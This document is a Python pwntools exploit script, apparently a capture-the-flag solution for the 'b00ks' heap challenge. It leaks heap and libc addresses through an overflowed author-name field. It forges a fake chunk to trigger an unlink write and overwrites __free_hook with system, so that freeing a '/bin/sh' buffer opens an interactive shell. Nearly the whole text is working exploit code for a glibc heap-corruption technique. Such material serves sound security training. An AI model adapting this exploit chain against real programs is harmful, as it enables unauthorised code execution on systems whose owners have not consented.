from pwn import *
context.log_level = 'info'

p = process("./b00ks")
elf = ELF("./b00ks")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def create(book_size, book_name, desc_size, desc):
    p.recvuntil(">")
    p.sendline(str(1))
    p.sendlineafter(": ", str(book_size))

    p.recvuntil(": ")
    p.sendline(book_name)

    p.recvuntil(": ")
    p.sendline(str(desc_size))
    p.sendline(desc)

def remove(idx):
    p.recvuntil(">")
    p.sendline(str(2))
    p.sendlineafter(": ", str(idx))

def edit(idx, desc):
    p.recvuntil(">")
    p.sendline(str(3))
    p.sendlineafter(": ", str(idx))
    p.sendlineafter(": ", str(desc))

def show():
    p.recvuntil(">")
    p.sendline(str(4))

def author_name(name):
    p.recvuntil(">")
    p.sendline(str(5))
    p.sendlineafter(": ", str(name))


p.recvuntil("author name: ")
p.sendline("skye".ljust(32,'a'))
create(0x20,'a'*8,0x20,'b'*8)#1

show()
p.recvuntil("skye".ljust(32,'a'))
first_heap = u64(p.recv(6).ljust(8,'\x00'))
log.info("first_heap:"+hex(first_heap))
heap_base = first_heap - 0x1080
log.info("heap_base:"+hex(heap_base))

create(0x20,'c'*8,0x20,'d'*8)#2
create(0x20,'e'*8,0x20,'f'*8)#3
remove(2)
remove(3)

create(0x20,'g'*8,0x208,'h'*8)#4
# make sure chunk5size low bit is 01,or corruption (!prev)
create(0x20,'i'*8,0x200-0x10,'j'*8)#5
create(0x20,"/bin/sh\x00",0x200,'k'*8)#6

ptr = heap_base + 0x1180# target addr
log.info("ptr:"+hex(ptr))
payload = p64(0)+p64(0x201)+ p64(ptr-0x18) + p64(ptr-0x10) 
payload += '\x00'*0x1e0+p64(0x200)
edit(4,payload)
remove(5)# unlink *ptr = ptr-0x18

payload = p64(0x31)+p64(0x4)+p64(heap_base+0x11e0)+p64(heap_base+0x10c0)
edit(4,payload)

show()
p.recvuntil("Name: ")
p.recvuntil("Name: ")
main_area = u64(p.recv(6).ljust(8,'\x00'))
log.info("main_area:"+hex(main_area))
libc_base = main_area - 0x3c4b78
log.info("libc_base:"+hex(libc_base))
free_hook = libc_base + libc.symbols['__free_hook']
log.info("free_hook:"+hex(free_hook))
system = libc_base + libc.symbols['system']
log.info("system:"+hex(system))

payload = p64(free_hook)
edit(4,payload)

payload = p64(system)
edit(6,payload)

remove(6)

#gdb.attach(p,"b *$rebase(0x202018)")
p.interactive()